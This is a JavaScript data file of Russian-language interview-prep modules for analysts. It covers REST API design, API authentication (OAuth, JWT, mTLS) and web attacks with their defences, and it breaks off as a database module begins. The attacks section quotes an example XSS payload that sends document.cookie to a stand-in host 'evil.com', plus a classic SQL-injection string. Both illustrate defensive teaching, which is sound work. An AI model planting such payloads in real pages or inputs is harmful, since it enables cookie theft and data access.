const BREST = {id:"brest",icon:"🎨",title:"Проектирование REST API",tag:"хард-скилл",color:"teal",
desc:"Как спроектировать ресурсы и методы, пагинация и фильтры, ошибки, версионирование, кэш и лимиты. Плюс инструменты аналитика.",
topics:[

{id:"rest-1",title:"Ресурсы и методы: как проектировать",
theory:`<h4>Шаг 1. Выделяем ресурсы</h4>
<p>Ресурс — это <b>существительное</b>, сущность предметной области. Не действие. Правила именования:</p>
<ul>
<li><b>Множественное число:</b> <code>/clients</code>, <code>/loans</code>, а не <code>/client</code></li>
<li><b>Никаких глаголов в пути:</b> не <code>/getClient</code>, а <code>GET /clients/777</code>. Глагол — это HTTP-метод</li>
<li><b>Иерархия для вложенности:</b> <code>/clients/777/loans</code> — займы конкретного клиента</li>
<li><b>Не глубже двух уровней:</b> <code>/clients/777/loans/12/payments/5</code> — уже нечитаемо. Лучше <code>/payments?loan_id=12</code></li>
<li><b>kebab-case для составных слов:</b> <code>/promise-to-pay</code>, а не <code>/promiseToPay</code></li>
</ul>
<h4>Шаг 2. Подбираем методы</h4>
<table>
<tr><th>Задача</th><th>Метод и путь</th><th>Успех</th></tr>
<tr><td>Список клиентов</td><td><code>GET /clients</code></td><td>200</td></tr>
<tr><td>Один клиент</td><td><code>GET /clients/777</code></td><td>200 / 404</td></tr>
<tr><td>Создать обещание</td><td><code>POST /promises</code></td><td>201 + Location</td></tr>
<tr><td>Заменить целиком</td><td><code>PUT /promises/5</code></td><td>200 / 204</td></tr>
<tr><td>Изменить одно поле</td><td><code>PATCH /promises/5</code></td><td>200</td></tr>
<tr><td>Отменить</td><td><code>DELETE /promises/5</code></td><td>204</td></tr>
</table>
<h4>Что делать с действиями, которые не CRUD</h4>
<p>«Запустить обзвон», «пересчитать пеню», «эскалировать дело» — это не создание и не изменение ресурса. Три рабочих подхода:</p>
<ol>
<li><b>Превратить действие в ресурс.</b> Не «запустить обзвон», а «создать задачу на обзвон»: <code>POST /call-tasks</code>. Самый чистый вариант — заодно появляется история и статус.</li>
<li><b>Ресурс-состояние.</b> Эскалация — это смена статуса: <code>PATCH /cases/12 {"status":"escalated"}</code>.</li>
<li><b>Явное действие как подресурс.</b> <code>POST /cases/12/recalculate</code>. Отступление от чистого REST, но читаемо и все понимают. Использовать точечно, а не везде.</li>
</ol>
<div class="co warn"><span class="co-i">⚠️</span><span><b>Появился ли метод QUERY?</b> Да, но осторожно с формулировками. HTTP QUERY — это <b>черновик стандарта</b> (Internet-Draft рабочей группы HTTPbis), а не утверждённый метод. Идея: безопасный и идемпотентный метод <b>с телом запроса</b> — чтобы сложные поисковые фильтры отправлять в теле, а не пихать в строку URL, упираясь в её ограничение длины. Пока широкой поддержки нет. На собесе честный ответ: «знаю про такой черновик, задача — заменить POST-костыль для сложного поиска, но в проде я бы пока на него не закладывался». Это прозвучит сильнее, чем уверенное «да, есть» или «нет, нету». Мои сведения тут могут быть неактуальны — стоит перепроверить текущий статус.</span></div>`,
prac:"Спроектируй API для «обещания оплаты»: создать, получить, список с фильтром по клиенту и статусу, изменить дату, отменить. Для каждого эндпоинта выпиши метод, путь, код успеха и минимум два кода ошибки. Проверь себя: есть ли у тебя 409 (обещание уже существует) и 422 (дата в прошлом)?",
questions:[
{q:"Как правильно именовать эндпоинты?",
short:"Ресурсы — существительные во множественном числе, действие выражается HTTP-методом, а не словом в пути. Вложенность не глубже двух уровней, составные слова через дефис. GET /clients/777/loans, а не /getClientLoans.",
long:`<b>Логика такая:</b> URL отвечает на вопрос «что», метод — «что с этим сделать». Поэтому <code>GET /clients/777</code>, а не <code>/getClient?id=777</code>.<br><br><b>Почему множественное число:</b> коллекция и элемент выглядят единообразно. <code>/clients</code> — все, <code>/clients/777</code> — один. С единственным числом получается несогласованно.<br><br><b>Про вложенность.</b> Правило простое: вкладываем, только если дочерний ресурс не существует без родителя и вы почти всегда запрашиваете его в этом контексте. Иначе — плоский путь с фильтром: <code>/payments?loan_id=12</code>.<br><br><b>Что делать с не-CRUD действиями</b> — сильная часть ответа. Лучший приём: превратить действие в ресурс. «Запустить обзвон» → <code>POST /call-tasks</code>. Появляется сущность, у неё есть идентификатор, статус и история — это удобнее и для отладки, и для аудита, который в банке обязателен.<br><br><b>Одно правило важнее всех остальных:</b> единообразие внутри одного API. Даже неидеальное, но последовательное именование лучше, чем смесь трёх стилей.`}
]},

{id:"rest-2",title:"Пагинация, фильтры, форматы и ошибки",
theory:`<h4>Пагинация</h4>
<table>
<tr><th></th><th>Offset-based</th><th>Cursor-based</th></tr>
<tr><td>Вид</td><td><code>?page=3&size=20</code></td><td><code>?cursor=eyJpZCI6NzQ0fQ&limit=20</code></td></tr>
<tr><td>Плюс</td><td>Можно прыгнуть на любую страницу, видно общее число</td><td>Стабильна при вставках, быстрая на больших смещениях</td></tr>
<tr><td>Минус</td><td>При вставке новых записей строки «сползают» и дублируются между страницами; OFFSET 100000 тормозит</td><td>Нельзя прыгнуть на страницу 50, сложнее реализовать</td></tr>
<tr><td>Когда</td><td>Админки, таблицы с номерами страниц</td><td>Ленты, бесконечная прокрутка, большие объёмы</td></tr>
</table>
<div class="co mem"><span class="co-i">🧠</span><span><b>Почему offset «сползает».</b> Вы читаете страницу 1 (записи 1–20). В этот момент кто-то добавил новую запись в начало. Читаете страницу 2 — и первая запись на ней уже была на странице 1. Курсор запоминает не номер, а позицию («после записи с id=744»), поэтому вставки его не сдвигают.</span></div>
<h4>Фильтрация и сортировка</h4>
<ul>
<li>Простые фильтры — query-параметры: <code>?status=overdue&region=ural</code></li>
<li>Диапазоны: <code>?due_date_from=2025-01-01&due_date_to=2025-03-01</code></li>
<li>Сортировка: <code>?sort=-due_date,amount</code> — минус означает по убыванию</li>
<li>Выбор полей: <code>?fields=id,full_name,amount</code> — экономит трафик</li>
</ul>
<h4>Path-параметры против query-параметров</h4>
<p><b>Path</b> — идентифицирует конкретный ресурс, обязателен: <code>/clients/777</code>. <b>Query</b> — уточняет выборку, обычно опционален: <code>?status=active</code>. Правило: если без параметра запрос теряет смысл — он в пути.</p>
<div class="co warn"><span class="co-i">⚠️</span><span>Длина URL не бесконечна: браузеры и прокси начинают резать примерно после 2000 символов. Поэтому сложный поиск с десятком фильтров нельзя отправлять в query — приходится делать <code>POST /clients/search</code> с телом. Это признанный костыль, который и должен был решить метод QUERY.</span></div>
<h4>MIME-типы и согласование форматов</h4>
<ul>
<li><code>application/json</code> — стандарт для REST</li>
<li><code>application/xml</code> — legacy-интеграции</li>
<li><code>multipart/form-data</code> — загрузка файлов</li>
<li><code>application/octet-stream</code> — бинарные данные</li>
<li><code>application/problem+json</code> — стандартизованный формат ошибок (RFC 7807)</li>
</ul>
<p><b>Content negotiation:</b> клиент шлёт <code>Accept: application/json</code>, сервер отвечает в этом формате и подтверждает в <code>Content-Type</code>. Не может — отвечает <code>406 Not Acceptable</code>.</p>
<h4>Проектирование ошибок</h4>
<p>Плохая ошибка: <code>{"error": "Bad request"}</code>. Хорошая содержит машинный код, человекочитаемое сообщение, указание на поле и идентификатор для поиска в логах:</p>
<pre style="background:#0f1e2e;color:#8fe3d5;padding:12px 14px;border-radius:9px;font-size:11.5px;overflow-x:auto;line-height:1.6">HTTP/1.1 422 Unprocessable Entity
{
  "code": "PROMISE_DATE_IN_PAST",
  "message": "Дата обещания не может быть в прошлом",
  "field": "promise_date",
  "trace_id": "a3f2-7d1e-c9b4"
}</pre>
<div class="co tip"><span class="co-i">💡</span><span><b>Почему нужен машинный код ошибки.</b> Текст сообщения может меняться и переводиться — клиент не должен его парсить. Клиент реагирует на <code>code</code>. А <code>trace_id</code> позволяет пользователю прислать одну строку в поддержку, и вы найдёте весь путь запроса через все сервисы.</span></div>`,
prac:"Возьми список ошибок одного своего эндпоинта и проверь: есть ли у каждой машинный код? Указано ли поле, из-за которого ошибка? Есть ли trace_id? Если ошибки описаны как «400 — некорректный запрос», интеграторам придётся гадать, а поддержке — читать логи вручную.",
questions:[
{q:"Offset или cursor пагинация — что выбрать?",
short:"Offset проще и позволяет прыгать на любую страницу, но при вставке новых записей строки дублируются между страницами и большие смещения тормозят. Cursor стабилен и быстр, но не даёт произвольного перехода. Для админок offset, для лент и больших объёмов cursor.",
long:`<b>Проблема offset на практике.</b> Оператор листает список должников, отсортированный по дате. Пока он на первой странице, в систему падают новые записи. Переходит на вторую — и видит записи, которые уже видел. Часть данных при этом вообще не покажется. В отчётности это приводит к некорректным выгрузкам.<br><br><b>Проблема производительности:</b> <code>OFFSET 100000</code> заставляет БД прочитать и отбросить сто тысяч строк, прежде чем вернуть двадцать. Курсор превращается в <code>WHERE id > 744 LIMIT 20</code> — работает по индексу мгновенно независимо от глубины.<br><br><b>Что описывает аналитик в постановке:</b><br>— размер страницы по умолчанию и максимально допустимый (иначе кто-то запросит миллион записей)<br>— формат ответа: где лежат данные, где метаинформация о следующей странице<br>— поведение при пустом результате: 200 с пустым массивом<br>— обязательна ли стабильная сортировка — без неё порядок между запросами может меняться, и пагинация ломается даже без вставок`},
{q:"Как проектировать ошибки API?",
short:"Правильный HTTP-код плюс структурированное тело: машинный код ошибки, человекочитаемое сообщение, поле-виновник и trace_id. Клиент реагирует на машинный код, а не парсит текст.",
long:`<b>Три уровня информации в ошибке:</b><br>1. <b>HTTP-код</b> — что делать вообще: повторять (5xx, 429) или исправлять запрос (4xx).<br>2. <b>Машинный код</b> — что конкретно не так: <code>INSUFFICIENT_BALANCE</code>, <code>LIMIT_EXCEEDED</code>. По нему клиент строит логику.<br>3. <b>Сообщение и поле</b> — что показать пользователю и куда подсветить в форме.<br><br><b>Почему нельзя парсить текст:</b> текст меняется при правках, переводится, дополняется. Клиент, разбирающий строку, ломается при первой же редактуре.<br><br><b>Про trace_id</b> — это то, что отличает зрелое API. Один идентификатор проходит через все сервисы. Пользователь присылает его в поддержку, и вы находите весь путь запроса в логах за секунды вместо получаса раскопок.<br><br><b>Стандарт RFC 7807 (Problem Details)</b> задаёт единый формат с полями type, title, status, detail, instance. Использовать его — хороший тон, особенно в публичном API.<br><br><b>Отдельно про безопасность:</b> в ошибке не должно быть стектрейсов, SQL-запросов и внутренних адресов. Это подсказки для атакующего.`}
]},

{id:"rest-3",title:"Версионирование, кэш, лимиты, batch",
theory:`<h4>Версионирование</h4>
<table>
<tr><th>Способ</th><th>Пример</th><th>Плюс / минус</th></tr>
<tr><td>В URL</td><td><code>/v1/clients</code></td><td>Наглядно, легко тестировать · загрязняет путь</td></tr>
<tr><td>В заголовке</td><td><code>Accept: application/vnd.bank.v2+json</code></td><td>Чистый URL · неудобно в браузере и логах</td></tr>
<tr><td>В query</td><td><code>?version=2</code></td><td>Просто · легко потерять при копировании</td></tr>
</table>
<p><b>Семантическое версионирование</b> — <code>MAJOR.MINOR.PATCH</code>. Мажорную версию поднимают только при <b>ломающих</b> изменениях.</p>
<p><b>Что ломает совместимость:</b> удаление поля, переименование, смена типа, новое обязательное поле в запросе, изменение семантики значения, сужение допустимых значений.</p>
<p><b>Что не ломает:</b> новое опциональное поле в ответе, новый эндпоинт, новое опциональное поле в запросе, новый код ошибки (если клиент корректно обрабатывает неизвестные).</p>
<div class="co tip"><span class="co-i">💡</span><span><b>Правило устаревания.</b> Не удаляйте поле сразу — пометьте <code>deprecated</code>, отдавайте заголовок <code>Deprecation</code> и <code>Sunset</code> с датой отключения, оповестите потребителей и дайте срок миграции. В банке этот срок обычно измеряется кварталами, а не неделями.</span></div>
<h4>Управление кэшем через заголовки</h4>
<ul>
<li><code>Cache-Control: max-age=300</code> — можно хранить 5 минут</li>
<li><code>Cache-Control: no-store</code> — не хранить вообще. Для персональных и финансовых данных</li>
<li><code>Cache-Control: private</code> — можно кэшировать только у клиента, не на прокси</li>
<li><code>ETag: "a3f2c9"</code> — версия ресурса. Клиент присылает <code>If-None-Match</code>, и если не изменилось — приходит <code>304</code> без тела</li>
<li><code>Last-Modified</code> / <code>If-Modified-Since</code> — то же самое, но по времени</li>
</ul>
<div class="co fin"><span class="co-i">🏦</span><span>Справочники (регионы, типы задолженности) — кэшировать смело с длинным max-age. Остаток долга и лимиты по 230-ФЗ — <code>no-store</code>. Показать устаревшую сумму долга хуже, чем сходить в базу.</span></div>
<h4>Rate limiting — ограничение частоты</h4>
<p>Алгоритмы: <b>Token Bucket</b> (накапливаются токены, каждый запрос тратит один — допускает короткие всплески), <b>Leaky Bucket</b> (очередь с постоянной скоростью обработки — сглаживает), <b>Fixed / Sliding Window</b> (счётчик за окно времени).</p>
<p>Сервер сообщает лимиты заголовками: <code>X-RateLimit-Limit</code>, <code>X-RateLimit-Remaining</code>, <code>X-RateLimit-Reset</code>. При превышении — <code>429</code> и обязательно <code>Retry-After</code>.</p>
<h4>Batch и chunked</h4>
<ul>
<li><b>Batch</b> — несколько операций одним запросом. Экономит round-trip'ы. Ключевой вопрос проектирования: если одна операция из ста упала — откатывать всё или вернуть частичный результат? Это решает аналитик, и это надо явно записать.</li>
<li><b>Chunked transfer</b> — ответ передаётся кусками, не дожидаясь готовности целиком. Позволяет отдавать большие выгрузки потоком, не собирая их в памяти.</li>
<li><b>Range-запросы</b> — забрать часть файла: <code>Range: bytes=0-1023</code>, ответ <code>206 Partial Content</code>. Так работает докачка.</li>
</ul>`,
prac:"Проверь своё API на обратную совместимость: что произойдёт со старым клиентом, если завтра добавить в ответ новое поле? А если сделать существующее необязательным? А если поменять формат даты? Третий случай ломает всех — и это самая частая причина инцидентов при релизе.",
questions:[
{q:"Как версионировать API и обеспечивать обратную совместимость?",
short:"Чаще всего версия в URL — это наглядно и просто тестировать. Мажорную версию поднимают только при ломающих изменениях. Совместимость обеспечивают добавлением опциональных полей вместо изменения существующих и постепенным выводом старого через deprecated.",
long:`<b>Принцип «расширяй, не ломай»:</b><br>— Добавить опциональное поле в ответ — безопасно, старый клиент его проигнорирует<br>— Удалить или переименовать поле — ломает всех<br>— Сделать поле обязательным в запросе — ломает всех<br>— Изменить формат значения (дата, разделитель, единица измерения) — ломает всех и обнаруживается не сразу<br><br><b>Цикл вывода версии из эксплуатации:</b><br>1. Помечаем <code>deprecated</code> в документации и в заголовке ответа<br>2. Указываем дату отключения через <code>Sunset</code><br>3. Уведомляем всех потребителей — в банке это отдельный формальный процесс<br>4. Мониторим, кто ещё ходит на старую версию<br>5. Отключаем только когда трафик обнулился<br><br><b>Практическое ограничение:</b> держать больше двух мажорных версий одновременно — тяжело. Каждая версия требует поддержки, тестов и исправления багов в обеих.<br><br><b>Роль аналитика:</b> определить, ломающее ли изменение, спланировать миграцию потребителей и зафиксировать сроки. Это не техническое решение, а организационное.`},
{q:"Что такое rate limiting и зачем он нужен?",
short:"Ограничение числа запросов за период времени. Защищает от перегрузки, злоупотреблений и перебора. При превышении возвращается 429 с заголовком Retry-After. Основные алгоритмы — token bucket и sliding window.",
long:`<b>Три задачи, которые решает:</b><br>1. <b>Защита от перегрузки</b> — один клиент с кривым циклом не должен положить сервис для всех.<br>2. <b>Защита от злоупотреблений</b> — перебор паролей, парсинг базы клиентов через API.<br>3. <b>Справедливое распределение</b> — в публичном API у каждого потребителя своя квота.<br><br><b>Token bucket на пальцах:</b> у клиента ведро на 100 токенов, пополняется по 10 в секунду. Каждый запрос тратит токен. Копил ведро — можешь сделать всплеск в 100 запросов. Ведро пусто — жди пополнения. Такой алгоритм разрешает короткие всплески, но ограничивает средний темп.<br><br><b>Что должен указать аналитик:</b> лимиты по типам клиентов (мобильное приложение, партнёр, внутренний сервис), окно, поведение при превышении, есть ли эндпоинты вне лимитов (проверка здоровья).<br><br><b>Важная деталь:</b> вместе с 429 обязательно возвращать <code>Retry-After</code>. Без него клиент не знает, когда повторить, и начинает долбить чаще — то есть защита превращается в усилитель проблемы.`}
]},

{id:"rest-4",title:"Документирование и инструменты аналитика",
theory:`<h4>OpenAPI (Swagger)</h4>
<p>Машиночитаемое описание REST API в YAML или JSON. Что даёт: интерактивную документацию, генерацию клиентского кода, генерацию заглушек (моков), автоматическую валидацию запросов и ответов.</p>
<p><b>Два подхода к разработке:</b></p>
<ul>
<li><b>API First (Design First)</b> — сначала пишем контракт, согласуем со всеми, потом реализуем. Фронт и бэк работают параллельно, фронт использует мок. Дольше на старте, но исключает переделки.</li>
<li><b>Code First</b> — сначала код, спецификация генерируется из аннотаций. Быстрее, но контракт получается «как вышло», и договориться заранее не получается.</li>
</ul>
<div class="co tip"><span class="co-i">💡</span><span>Для аналитика API First — почти всегда правильный выбор. Контракт становится точкой согласования между командами, и вы можете обсудить его до того, как что-то написано. Переспорить готовый код гораздо сложнее.</span></div>
<h4>Аналоги в других стилях</h4>
<table>
<tr><th>Стиль</th><th>Описание контракта</th></tr>
<tr><td>REST</td><td>OpenAPI (Swagger)</td></tr>
<tr><td>SOAP</td><td>WSDL + XSD</td></tr>
<tr><td>JSON-RPC</td><td>OpenRPC</td></tr>
<tr><td>gRPC</td><td>.proto файл</td></tr>
<tr><td>GraphQL</td><td>SDL — схема типов</td></tr>
<tr><td>Асинхронные события</td><td>AsyncAPI</td></tr>
</table>
<h4>Четыре инструмента, которые должен знать аналитик</h4>
<ul>
<li><b>Postman</b> — отправка запросов, коллекции, переменные окружения, автотесты, генерация документации. Основной рабочий инструмент для проверки API.</li>
<li><b>cURL</b> — консольная отправка запросов. Незаменим, когда нужно быстро проверить что-то на сервере или приложить воспроизводимый пример к задаче:<br><code>curl -X POST https://api/v1/promises -H "Content-Type: application/json" -d '{"client_id":777}'</code></li>
<li><b>Chrome DevTools</b> — вкладка Network показывает реальные запросы фронта: заголовки, тело, коды, тайминги. Первое место, куда идёшь при разборе «у пользователя не работает».</li>
<li><b>SOAP UI</b> — работа с SOAP: подгружает WSDL, генерирует шаблоны запросов, валидирует по XSD. Умеет и REST, но именно для SOAP незаменим.</li>
</ul>
<div class="co ex"><span class="co-i">🔍</span><span><b>Разбор инцидента через DevTools — рабочий сценарий.</b> Пользователь говорит «кнопка не работает». Открываете Network, воспроизводите. Видите: запрос ушёл, вернулся 422 с кодом <code>PROMISE_DATE_IN_PAST</code>. Всё — проблема не в кнопке, а в валидации даты, и разработчику можно сразу нести конкретику вместо «не работает».</span></div>`,
prac:"Собери в Postman коллекцию из пяти запросов к своему API: создание, чтение, список с фильтром, изменение, удаление. Добавь переменную окружения для базового URL и токена. Это заготовка, которая пригодится и для проверки задач, и для демонстрации на собеседовании.",
questions:[
{q:"Что такое OpenAPI и зачем он аналитику?",
short:"Машиночитаемое описание REST API: эндпоинты, параметры, схемы данных, коды ответов. Из него генерируются документация, клиентский код и моки. Для аналитика это форма постановки задачи на API, понятная и людям, и инструментам.",
long:`<b>Что даёт на практике:</b><br>— <b>Интерактивная документация</b> — Swagger UI, где можно тут же отправить запрос<br>— <b>Генерация клиентов</b> на любом языке — интеграторам не надо писать обвязку руками<br>— <b>Моки</b> — фронтенд начинает работу до готовности бэкенда<br>— <b>Валидация</b> — запросы и ответы автоматически проверяются на соответствие схеме<br>— <b>Контрактные тесты</b> — CI ловит несовместимые изменения до релиза<br><br><b>Почему API First лучше для аналитика.</b> Контракт становится предметом согласования между командами. Обсудить структуру ответа <b>до</b> того, как её реализовали, стоит десять минут. После — это уже переделка с оценкой и приоритизацией.<br><br><b>Что аналитик обязан описать в спецификации, а обычно забывает:</b> примеры запроса и ответа (не только схему), все коды ошибок с машинными кодами, обязательность и ограничения полей, поведение при пустом результате, лимиты пагинации.<br><br><b>Главная проблема на практике:</b> спецификация расходится с реальностью. Лечится только генерацией из кода или контрактными тестами в CI.`}
]}
]};

const BSEC = {id:"bsec",icon:"🔐",title:"Безопасность API",tag:"обязательно",color:"rose",
desc:"Способы аутентификации от api-key до OAuth 2.0, атаки XSS, CSRF, clickjacking и как от них защищаются.",
topics:[

{id:"sec-1",title:"Способы аутентификации: от api-key до OAuth",
theory:`<table>
<tr><th>Способ</th><th>Как работает</th><th>Когда применяют</th></tr>
<tr><td><b>Basic Auth</b></td><td>Логин и пароль в заголовке, закодированные base64</td><td>Только внутри защищённого контура. Base64 — не шифрование!</td></tr>
<tr><td><b>API Key</b></td><td>Статический ключ в заголовке или query</td><td>Простые серверные интеграции, публичные API с квотами</td></tr>
<tr><td><b>Bearer Token</b></td><td>Токен в заголовке Authorization</td><td>Основной способ в современных API</td></tr>
<tr><td><b>JWT</b></td><td>Самодостаточный подписанный токен</td><td>Микросервисы — проверка подписи без похода в БД</td></tr>
<tr><td><b>OAuth 2.0</b></td><td>Делегирование доступа без передачи пароля</td><td>Вход через внешнего провайдера, доступ партнёров</td></tr>
<tr><td><b>mTLS</b></td><td>Обе стороны предъявляют сертификаты</td><td>Межсистемные интеграции, банковский контур</td></tr>
</table>
<div class="co warn"><span class="co-i">⚠️</span><span><b>Про API Key — частая ошибка проектирования.</b> Ключ статический и не истекает сам. Если он утёк, доступ у злоумышленника навсегда, пока ключ не отзовут вручную. Поэтому: никогда не передавать ключ в query-параметре (он попадёт в логи и историю браузера), только в заголовке; обязательно предусмотреть ротацию и возможность иметь два активных ключа одновременно, чтобы менять без простоя.</span></div>
<h4>Структура JWT</h4>
<p>Три части через точку: <code>header.payload.signature</code>.</p>
<ul>
<li><b>Header</b> — алгоритм подписи</li>
<li><b>Payload</b> — claims: <code>sub</code> (кто), <code>exp</code> (до когда), <code>iat</code> (когда выдан), роли, любые свои поля</li>
<li><b>Signature</b> — подпись первых двух частей</li>
</ul>
<div class="co fin"><span class="co-i">🏦</span><span><b>Две ловушки JWT, критичные для банка.</b><br>Первая: payload только <b>закодирован</b> base64, а не зашифрован — любой его прочитает. Класть туда ФИО, телефон или паспорт нельзя, это утечка персональных данных.<br>Вторая: токен нельзя мгновенно отозвать. Уволили сотрудника — его токен работает до истечения срока. Лечится коротким временем жизни плюс refresh-токен, либо списком отозванных в Redis, но тогда теряется главное преимущество — независимость от хранилища.</span></div>
<h4>OAuth 2.0 — потоки</h4>
<ul>
<li><b>Authorization Code + PKCE</b> — основной и рекомендованный для приложений с пользователем. PKCE обязателен для мобильных и SPA, где негде хранить client_secret.</li>
<li><b>Client Credentials</b> — сервис-сервис, без участия пользователя. Приложение получает токен по своему идентификатору и секрету.</li>
<li><b>Device Code</b> — для устройств без удобного ввода: телевизор показывает код, вводишь его с телефона.</li>
<li><b>Implicit и Resource Owner Password</b> — устаревшие, использовать не рекомендуется.</li>
</ul>
<div class="co tip"><span class="co-i">💡</span><span><b>OAuth — про авторизацию, OpenID Connect — про аутентификацию.</b> Чистый OAuth 2.0 отвечает на вопрос «что этому приложению разрешено», но не «кто этот пользователь». OIDC — надстройка над OAuth, которая добавляет id_token с информацией о пользователе. Когда говорят «вход через Google» — технически это OIDC.</span></div>`,
prac:"Определи для своего продукта, какой способ аутентификации подходит каждому потребителю: мобильное приложение, веб-кабинет, внутренний сервис, внешний партнёр. Для каждого — обоснование в одно предложение. Если на все четыре ответ одинаковый, скорее всего где-то компромисс не в пользу безопасности.",
questions:[
{q:"Какие способы аутентификации в API вы знаете?",
short:"Basic Auth, API-key, Bearer-токены, JWT, OAuth 2.0 и mTLS. Выбор зависит от того, кто потребитель: пользователь через приложение, внешний партнёр или внутренний сервис.",
long:`<b>Логика выбора по потребителю:</b><br><br><b>Пользователь через приложение</b> → OAuth 2.0 с Authorization Code + PKCE. Пароль не проходит через наше приложение, токены короткоживущие.<br><br><b>Внешний партнёр, сервер-сервер</b> → OAuth Client Credentials или mTLS. В банковских интеграциях чаще mTLS: сертификат выдаётся под конкретного контрагента и подтверждает его личность на уровне транспорта.<br><br><b>Внутренние сервисы</b> → JWT с подписью или mTLS через service mesh. Проверка подписи локальная, без похода в централизованный сервис — это важно для производительности.<br><br><b>Публичное API с квотами</b> → API-key для идентификации потребителя плюс rate limiting по нему.<br><br><b>Чего избегать:</b> Basic Auth за пределами защищённого контура — пароль летит в каждом запросе, base64 не защита. И ключей в query-параметрах: они оседают в логах nginx, в истории браузера и в реферерах.`},
{q:"Что такое OAuth 2.0 и зачем нужен refresh token?",
short:"Протокол делегированного доступа: приложение получает право действовать от имени пользователя, не зная его пароля. Access token делают короткоживущим на случай утечки, а refresh token позволяет тихо получить новый без повторного входа.",
long:`<b>Четыре участника:</b> пользователь (владелец данных), приложение (клиент), сервер авторизации (выдаёт токены), сервер ресурсов (отдаёт данные).<br><br><b>Почему нужен промежуточный authorization code.</b> Код летит через браузер и виден в адресной строке и истории. Сам по себе он бесполезен: обменять его на токен можно только с бэкенда и только предъявив client_secret. Токен таким образом никогда не появляется в браузере.<br><br><b>PKCE</b> закрывает случай, когда client_secret хранить негде — мобильное приложение и SPA. Клиент генерирует случайную строку, отправляет её хеш при запросе кода, а саму строку — при обмене. Перехвативший код не сможет им воспользоваться.<br><br><b>Баланс времени жизни:</b> длинный access token означает долгий доступ при утечке. Короткий без refresh — постоянные логины. Отсюда связка: access на 15 минут, refresh на дни.<br><br><b>Ротация refresh-токенов</b> — при каждом обмене выдаётся новый, старый инвалидируется. Если один и тот же refresh пришёл дважды, значит его украли — вся цепочка отзывается.`}
]},

{id:"sec-2",title:"Атаки и защита",
theory:`<h4>XSS — межсайтовый скриптинг</h4>
<p><b>Суть:</b> злоумышленник внедряет свой JavaScript в страницу, которую увидит другой пользователь. Скрипт выполняется в браузере жертвы с её правами — может украсть куки, токен, отправить запрос от её имени.</p>
<p><b>Пример:</b> в поле «комментарий по делу» оператор вписывает <code>&lt;script&gt;fetch('evil.com?c='+document.cookie)&lt;/script&gt;</code>. Если система сохранит это как есть и покажет другому оператору без экранирования — скрипт выполнится у него.</p>
<p><b>Защита:</b> экранирование при выводе (главное), валидация на входе, заголовок <code>Content-Security-Policy</code>, флаг <code>HttpOnly</code> на куках — тогда JavaScript до них не доберётся.</p>
<h4>CSRF — подделка межсайтового запроса</h4>
<p><b>Суть:</b> пользователь залогинен в банке. Открывает вредоносный сайт, тот незаметно отправляет запрос на банковский домен. Браузер автоматически подставляет куки — и запрос выполняется от имени пользователя.</p>
<p><b>Защита:</b> CSRF-токен, который вредоносный сайт не может узнать; атрибут куки <code>SameSite=Strict</code> или <code>Lax</code>; проверка заголовка Origin. Если авторизация идёт через заголовок Authorization, а не куки — CSRF практически не работает, потому что браузер сам заголовки не подставляет.</p>
<h4>Clickjacking — перехват клика</h4>
<p><b>Суть:</b> ваш сайт загружают в прозрачный iframe поверх приманки. Пользователь думает, что жмёт «Получить приз», а на самом деле кликает «Подтвердить перевод» на невидимой странице банка.</p>
<p><b>Защита:</b> заголовок <code>X-Frame-Options: DENY</code> или <code>Content-Security-Policy: frame-ancestors 'none'</code> — запрет встраивания сайта в чужие фреймы.</p>
<h4>SQL-инъекция</h4>
<p><b>Суть:</b> пользовательский ввод попадает в SQL-запрос как часть кода. Классика — ввести в поле поиска <code>' OR 1=1 --</code> и получить всю таблицу.</p>
<p><b>Защита:</b> только параметризованные запросы (prepared statements). Никакой склейки строк, никакой «фильтрации опасных символов» — она всегда обходится.</p>
<h4>Что ещё стоит знать</h4>
<ul>
<li><b>IDOR</b> — доступ к чужому объекту простой подменой идентификатора в URL. Лечится проверкой прав на <b>каждый</b> объект, а не только на эндпоинт. Самая частая реальная дыра в корпоративных системах.</li>
<li><b>Массовое присвоение</b> — клиент передаёт в теле поле, которое менять не должен (например, <code>role: admin</code>), а сервер бездумно применяет весь объект. Лечится явным списком разрешённых полей.</li>
<li><b>Утечка через ошибки</b> — стектрейсы и SQL-запросы в ответе подсказывают атакующему структуру системы.</li>
</ul>
<div class="co fin"><span class="co-i">🏦</span><span><b>Что из этого зона ответственности аналитика.</b> Не написание защиты — это к разработчикам. Но в постановке вы обязаны явно указать: кто имеет право видеть каждый объект (не только эндпоинт!), какие поля клиент может изменять, что попадает в аудит-лог, какие данные нельзя отдавать наружу. IDOR и массовое присвоение — это в первую очередь дыры в требованиях, а не в коде.</span></div>`,
prac:"Проверь один свой эндпоинт на IDOR: что произойдёт, если оператор из региона А подставит в URL идентификатор дела из региона Б? Если ответ «покажется» или «не знаю» — вы только что нашли реальную уязвимость, и её надо закрывать требованием, а не надеждой на разработчика.",
questions:[
{q:"Какие атаки на веб-приложения вы знаете?",
short:"XSS — внедрение чужого скрипта в страницу. CSRF — запрос от имени залогиненного пользователя с чужого сайта. Clickjacking — клик по невидимому фрейму. SQL-инъекция — ввод, попадающий в запрос как код. IDOR — доступ к чужому объекту подменой идентификатора.",
long:`Аналитику важно понимать не механику эксплуатации, а <b>что должно быть в требованиях</b>, чтобы дыры не появилось.<br><br><b>XSS</b> — требование: любой пользовательский ввод экранируется при выводе. Особенно опасны поля, которые видит другой пользователь: комментарии, названия, примечания к делу.<br><br><b>CSRF</b> — актуален там, где авторизация через куки. Если API использует Bearer-токен в заголовке, атака практически не работает.<br><br><b>IDOR</b> — самая частая реальная дыра и самая «аналитическая». Права проверяются на эндпоинт («операторам можно смотреть дела»), но не на конкретный объект («это дело относится к его региону»). В постановке должно быть явно: кто какие объекты видит и по какому признаку.<br><br><b>Массовое присвоение</b> — тоже дыра в требованиях: не указали, какие поля клиент может менять, разработчик применил объект целиком.<br><br><b>Хороший финал ответа:</b> «Я не реализую защиту, но в постановке фиксирую матрицу доступа на уровне объектов, список изменяемых полей и состав аудит-лога — большинство инцидентов растёт именно из пробелов здесь».`}
]}
]};

const BDB = {id:"bdb",icon:"💾",title:"Базы данных: глубокое погружение",tag:"хард-скилл",color:"blue",
desc:"ACID и аномалии в анимации, уровни изоляции, ключи, нормализация на таблицах, индексы, и разбор PostgreSQL, ClickHouse, Greenplum, Hadoop, Pangolin.",
topics:[

{id:"db-1",title:"ACID, транзакции и аномалии",
theory:`<p><b>Транзакция</b> — группа операций, которая должна выполниться как одно целое. Классический пример: погашение долга — списать со счёта и уменьшить задолженность. По отдельности эти операции бессмысленны и опасны.</p>
`+D.acid+`
<h4>Четыре буквы</h4>
<ul>
